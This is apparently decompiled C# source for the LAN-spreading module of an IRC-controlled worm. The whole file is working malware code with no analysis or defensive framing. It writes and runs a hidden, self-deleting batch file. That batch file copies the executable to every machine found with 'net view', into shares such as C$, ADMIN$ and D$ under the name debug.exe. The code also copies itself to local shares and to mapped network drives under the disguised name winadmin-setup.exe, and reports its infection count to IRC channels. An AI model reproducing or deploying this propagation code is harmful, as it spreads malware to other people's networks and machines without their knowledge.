using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Windows.Forms;
using Microsoft.Win32;

namespace rundll32.spreaders;

internal class lan
{
	public static void spread(string name, irc irc)
	{
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_0199: Expected O, but got Unknown
		int num = 0;
		StreamWriter streamWriter = new StreamWriter("share.bat");
		streamWriter.WriteLine("@echo off & break off");
		streamWriter.WriteLine("net view >log.txt");
		streamWriter.WriteLine("for /f %%t in (log.txt) do ( ");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\IPC$\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\ADMIN$\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\C$\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\D$\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\PRINT$\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\e$\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\e$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\d$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\C$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + name + "\" %%t\\shared\\debug.exe");
		streamWriter.WriteLine(")");
		streamWriter.WriteLine("del log.txt");
		streamWriter.WriteLine("del %0");
		streamWriter.Close();
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = "share.bat";
		process.Start();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("select * from win32_share");
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					string text = Convert.ToString(((ManagementBaseObject)val2).get_Item("Name"));
					if (!text.Contains("$"))
					{
						try
						{
							File.Copy(Application.get_ExecutablePath(), "\\\\" + Environment.MachineName + "\\" + text + "\\winadmin-setup.exe", overwrite: true);
							num++;
						}
						catch
						{
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name2);
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text2 in valueNames)
			{
				string text3 = registryKey.GetValue(text2)!.ToString();
				if (text2.ToLower() != "mrulist")
				{
					try
					{
						File.Copy(Application.get_ExecutablePath(), text3 + "\\\\winadmin-setup.exe", overwrite: true);
						num++;
					}
					catch
					{
					}
				}
			}
			registryKey.Close();
		}
		catch (Exception)
		{
		}
		string[][] onConnChannels = config.onConnChannels;
		foreach (string[] array in onConnChannels)
		{
			if (num != 0)
			{
				irc.sendMessage(array[0], ".:LAN:. - \u000308Spreaded to \u000309" + num + "\u000308 locations!");
			}
		}
	}
}
